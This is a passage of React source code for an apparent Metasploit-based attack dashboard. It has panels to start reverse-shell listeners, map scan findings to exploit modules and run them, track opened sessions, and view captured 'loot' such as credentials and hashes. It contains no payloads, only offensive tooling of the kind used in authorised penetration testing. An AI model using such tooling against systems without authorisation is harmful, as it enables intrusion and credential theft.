            <div className="glass rounded-xl p-5 border border-cyan-900/20">
              <h3 className="text-sm font-semibold text-slate-200 mb-4 flex items-center gap-2">
                <Radio size={14} className="text-cyan-400" /> Start Listener (multi/handler)
              </h3>
              <div className="grid grid-cols-3 gap-3 items-end">
                <div className="col-span-3">
                  <label className="text-xs text-slate-500 mb-1 block">Payload</label>
                  <select className={inputClass} style={{ background: '#05080d' }} value={listenerPayload} onChange={e => setListenerPayload(e.target.value)}>
                    {payloads.map(p => <option key={p.value} value={p.value}>{p.label}</option>)}
                  </select>
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LHOST</label>
                  <input value={listenerLhost} onChange={e => setListenerLhost(e.target.value)} className={inputClass} placeholder="0.0.0.0" />
                </div>
                <div>
                  <label className="text-xs text-slate-500 mb-1 block">LPORT</label>
                  <input value={listenerLport} onChange={e => setListenerLport(e.target.value)} className={inputClass} placeholder="4444" />
                </div>
                <button
                  onClick={handleStartListener}
                  disabled={startingListener || !msfStatus.connected}
                  className="py-2 rounded-lg bg-green-600 hover:bg-green-500 disabled:opacity-40 text-sm text-white font-medium transition-all flex items-center justify-center gap-2"
                >
                  {startingListener ? <RefreshCw size={14} className="animate-spin" /> : <Play size={14} />}
                  Start
                </button>
              </div>
            </div>

            {/* Active listeners */}
            <div className="glass rounded-xl overflow-hidden border border-cyan-900/20">
              <div className="px-4 py-3 border-b border-cyan-900/20 flex items-center justify-between">
                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">
                  Active Jobs & Listeners {listeners.length > 0 && <span className="text-cyan-400 ml-1">({listeners.length})</span>}
                </span>
                <div className="flex items-center gap-3">
                  {msfStatus.connected && (
                    <button
                      onClick={async () => {
                        await fetch('/api/v1/c2/jobs/all', { method: 'DELETE' })
                        loadListeners()
                      }}
                      className="text-[11px] text-red-500 hover:text-red-300 transition-colors flex items-center gap-1"
                      title="Kill all MSF jobs"
                    >
                      <X size={11} /> Kill All
                    </button>
                  )}
                  <button onClick={loadListeners} className="text-slate-600 hover:text-cyan-400 transition-colors">
                    <RefreshCw size={13} />
                  </button>
                </div>
              </div>
              {listeners.length === 0 ? (
                <div className="text-center text-slate-600 py-8 text-xs">No active listeners</div>
              ) : listeners.map(l => (
                <div key={l.job_id} className="flex items-center gap-4 px-4 py-3 border-b border-cyan-900/10 hover:bg-cyan-950/10">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                  </span>
                  <div className="flex-1">
                    <div className="text-xs text-slate-200">{l.name}</div>
                    <div className="text-[10px] text-slate-500 font-mono">
                      {l.datastore?.PAYLOAD} · {l.datastore?.LHOST}:{l.datastore?.LPORT}
                    </div>
                  </div>
                  <span className="text-[10px] text-slate-600">Job #{l.job_id}</span>
                  <button onClick={() => handleStopListener(l.job_id)} className="text-slate-600 hover:text-red-400 transition-colors">
                    <X size={14} />
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Attack Plan tab */}
        {activeTab === 'attack' && (
          <div className="flex-1 flex flex-col min-h-0 gap-3 overflow-y-auto">
            {/* Header */}
            <div className="glass rounded-xl p-4 border border-cyan-900/20 flex items-center justify-between gap-4 flex-shrink-0">
              <div>
                <h3 className="text-sm font-semibold text-slate-200 flex items-center gap-2">
                  <Crosshair size={14} className="text-red-400" /> Attack Plan
                </h3>
                <p className="text-xs text-slate-500 mt-0.5">
                  Maps scan findings to Metasploit modules using CVE lookups and service fingerprinting.
                </p>
              </div>
              <div className="flex items-center gap-3 flex-shrink-0">
                {attackPlan && (
                  <span className="text-xs text-slate-500">
                    {attackPlan.matched_count} match{attackPlan.matched_count !== 1 ? 'es' : ''} from {attackPlan.finding_count} findings
                  </span>
                )}
                <button
                  onClick={handleGenerateAttackPlan}
                  disabled={generatingAttack || !selectedProject}
                  className="flex items-center gap-2 px-4 py-2 rounded-lg bg-red-700/80 hover:bg-red-600 disabled:opacity-40 text-sm text-white font-medium transition-all"
                  style={{ boxShadow: '0 0 10px rgba(239,68,68,0.2)' }}
                >
                  {generatingAttack
                    ? <><RefreshCw size={13} className="animate-spin" /> Scanning...</>
                    : <><Crosshair size={13} /> {attackPlan ? 'Refresh' : 'Analyze'}</>
                  }
                </button>
              </div>
            </div>

            {attackPlanError && (
              <p className="text-xs text-red-400 bg-red-950/30 border border-red-500/20 rounded-lg px-3 py-2 flex-shrink-0">{attackPlanError}</p>
            )}

            {attackPlan && attackPlan.recommendations.length === 0 && (
              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-12 text-slate-600">
                <Shield size={36} className="mb-3 opacity-20" />
                <p className="text-sm">No matching modules found</p>
                <p className="text-xs mt-1 text-slate-700">Run nmap/nikto scans to discover services and vulnerabilities first</p>
              </div>
            )}

            {attackPlan && attackPlan.recommendations.map((rec, i) => {
              const confColor = rec.confidence === 'high' ? 'text-red-400 border-red-500/30 bg-red-950/20'
                : rec.confidence === 'medium' ? 'text-amber-400 border-amber-500/30 bg-amber-950/20'
                : 'text-slate-400 border-slate-500/30 bg-slate-900/20'
              const sevColor = rec.finding_severity === 'critical' ? 'text-red-400'
                : rec.finding_severity === 'high' ? 'text-orange-400'
                : rec.finding_severity === 'medium' ? 'text-amber-400'
                : 'text-slate-500'
              return (
                <div key={i} className="glass rounded-xl border border-cyan-900/20 p-4 flex-shrink-0">
                  <div className="flex items-start gap-3 mb-3">
                    <span className={`text-[10px] font-bold px-2 py-0.5 rounded border uppercase flex-shrink-0 mt-0.5 ${confColor}`}>
                      {rec.confidence}
                    </span>
                    <div className="flex-1 min-w-0">
                      <code className="text-sm font-mono text-cyan-300">{rec.module}</code>
                      {rec.finding_title && (
                        <p className="text-xs text-slate-500 mt-0.5 truncate">
                          via <span className={`font-medium ${sevColor}`}>{rec.finding_title}</span>
                          <span className="text-slate-700 mx-1">·</span>
                          <span className="text-slate-600">{rec.match_reason}</span>
                        </p>
                      )}
                    </div>
                    <button
                      onClick={() => copyText(rec.module, `mod-${i}`)}
                      className="text-slate-600 hover:text-cyan-400 transition-colors flex-shrink-0"
                      title="Copy module path"
                    >
                      {copied === `mod-${i}` ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                    </button>
                  </div>

                  <p className="text-xs text-slate-400 mb-3">{rec.description}</p>

                  {/* Options — editable */}
                  {Object.keys(rec.options).length > 0 && (
                    <div className="bg-[#05080d] rounded-lg p-3 border border-cyan-900/20 mb-3 font-mono text-xs space-y-1.5">
                      <div className="text-slate-600 text-[10px] uppercase tracking-wider mb-2">msf options</div>
                      {Object.entries(rec.options).map(([k, v]) => (
                        <div key={k} className="flex items-center gap-3">
                          <span className="text-cyan-600 w-24 flex-shrink-0">set {k}</span>
                          <input
                            className="flex-1 bg-transparent border-b border-cyan-900/40 focus:border-cyan-500/60 outline-none text-slate-300 py-0.5"
                            defaultValue={v}
                            onChange={e => { rec.options[k] = e.target.value }}
                          />
                        </div>
                      ))}
                      {rec.payload && (
                        <div className="flex items-center gap-3">
                          <span className="text-cyan-600 w-24 flex-shrink-0">set PAYLOAD</span>
                          <input
                            className="flex-1 bg-transparent border-b border-cyan-900/40 focus:border-cyan-500/60 outline-none text-slate-300 py-0.5"
                            defaultValue={rec.payload}
                            onChange={e => { rec.payload = e.target.value }}
                          />
                        </div>
                      )}
                    </div>
                  )}

                  {/* Post modules */}
                  {rec.post_modules.length > 0 && (
                    <div className="flex flex-wrap gap-1.5 mb-3">
                      <span className="text-[10px] text-slate-600 self-center">post:</span>
                      {rec.post_modules.map(pm => (
                        <span key={pm} className="text-[10px] font-mono text-purple-400 bg-purple-950/30 border border-purple-500/20 px-2 py-0.5 rounded">
                          {pm}
                        </span>
                      ))}
                    </div>
                  )}

                  {/* Run button + result */}
                  {!rec.module.startsWith('—') && (
                    <div className="flex flex-col gap-2 pt-1 border-t border-cyan-900/10">
                    <div className="flex items-center gap-3">
                      <button
                        onClick={() => handleRunModule(rec, i)}
                        disabled={!msfStatus.connected || runningModule === i}
                        className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium transition-all disabled:opacity-40
                          bg-red-900/40 hover:bg-red-800/60 text-red-300 border border-red-700/30 hover:border-red-600/50"
                        title={!msfStatus.connected ? 'Connect to Metasploit first' : 'Run this module'}
                      >
                        {runningModule === i
                          ? <><RefreshCw size={11} className="animate-spin" /> Running...</>
                          : <><Play size={11} /> Run</>
                        }
                      </button>
                      {moduleResults[i] && (
                        moduleResults[i].error ? (
                          <span className="text-xs text-red-400">{moduleResults[i].error}</span>
                        ) : moduleResults[i].new_session_id ? (
                          <span className="text-xs text-green-400 flex items-center gap-1">
                            <span className="relative flex h-2 w-2">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
                              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
                            </span>
                            Session opened (MSF #{moduleResults[i].new_session_id})
                          </span>
                        ) : (
                          <span className="flex items-center gap-2 flex-wrap">
                            <span className="text-xs text-amber-400">
                              Job started{moduleResults[i].job_id ? ` (#${moduleResults[i].job_id})` : ''} — waiting for callback
                            </span>
                            <button
                              onClick={handleSync}
                              className="text-[10px] text-cyan-400 hover:text-cyan-300 underline underline-offset-2"
                            >
                              Sync sessions
                            </button>
                          </span>
                        )
                      )}
                    </div>
                    {moduleResults[i]?.msf_result && (
                      <pre className="text-[10px] font-mono text-slate-500 bg-[#05080d] rounded px-2 py-1.5 border border-cyan-900/20 overflow-x-auto">
                        {JSON.stringify(moduleResults[i].msf_result, null, 2)}
                      </pre>
                    )}
                    </div>
                  )}
                </div>
              )
            })}

            {attackPlan && attackPlan.unmatched_findings.length > 0 && (
              <div className="glass rounded-xl border border-cyan-900/10 p-4 flex-shrink-0">
                <p className="text-[10px] text-slate-600 uppercase tracking-wider mb-2">No module match found for:</p>
                <div className="space-y-1">
                  {attackPlan.unmatched_findings.map((f, i) => (
                    <div key={i} className="text-xs text-slate-600 flex items-center gap-2">
                      <span className="w-1.5 h-1.5 rounded-full bg-slate-700 flex-shrink-0" />
                      {f.title}
                      {f.cve_id && <span className="font-mono text-slate-700">{f.cve_id}</span>}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {!attackPlan && !generatingAttack && (
              <div className="flex-1 glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center text-slate-600 py-16">
                <Crosshair size={40} className="mb-3 opacity-20 text-red-600" />
                <p className="text-sm">Select a project and click Analyze</p>
                <p className="text-xs mt-1 text-slate-700">Works best after running nmap and nikto scans</p>
              </div>
            )}
          </div>
        )}

        {/* Loot tab */}
        {activeTab === 'loot' && (
          <div className="flex-1 overflow-y-auto space-y-3">
            {loot.length === 0 ? (
              <div className="glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center py-16 text-slate-600">
                <Database size={40} className="mb-3 opacity-20 text-amber-600" />
                <p className="text-sm">No loot captured yet</p>
                <p className="text-xs mt-1 text-slate-700">Run post-exploitation modules to capture credentials, hashes, and files</p>
              </div>
            ) : loot.map(item => (
              <div key={item.id} className="glass glass-hover rounded-xl border border-cyan-900/20 p-4">
                <div className="flex items-start gap-3">
                  <span className={`text-xs px-2 py-0.5 rounded border font-semibold uppercase flex-shrink-0 ${LOOT_COLORS[item.loot_type] || LOOT_COLORS.system_info}`}>
                    {item.loot_type}
                  </span>
                  <div className="flex-1 min-w-0">
                    <div className="text-sm text-slate-200 font-medium">{item.title}</div>
                    {item.source_path && <div className="text-xs text-slate-500 font-mono mt-0.5">{item.source_path}</div>}
                    <div className="text-xs text-slate-600 mt-0.5">{new Date(item.captured_at).toLocaleString()}</div>
                  </div>
                  <div className="flex gap-1 flex-shrink-0">
                    {item.content && (
                      <>
                        <button onClick={() => copyText(item.content, item.id)} className="text-slate-600 hover:text-cyan-400 transition-colors p-1">
                          {copied === item.id ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                        </button>
                        <button onClick={() => setShowLootContent(showLootContent === item.id ? null : item.id)} className="text-slate-600 hover:text-cyan-400 transition-colors p-1">
                          {showLootContent === item.id ? <EyeOff size={13} /> : <Eye size={13} />}
                        </button>
                      </>
                    )}
                    <button onClick={async () => { await fetch(`/api/v1/c2/loot/${item.id}`, { method: 'DELETE' }); loadLoot() }} className="text-slate-600 hover:text-red-400 transition-colors p-1">
                      <Trash2 size={13} />
                    </button>
                  </div>
                </div>
                {showLootContent === item.id && item.content && (
                  <pre className="mt-3 bg-[#05080d] rounded-lg p-3 text-xs font-mono text-slate-300 overflow-x-auto whitespace-pre-wrap border border-cyan-900/20 max-h-40 overflow-y-auto">
                    {item.content}
                  </pre>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
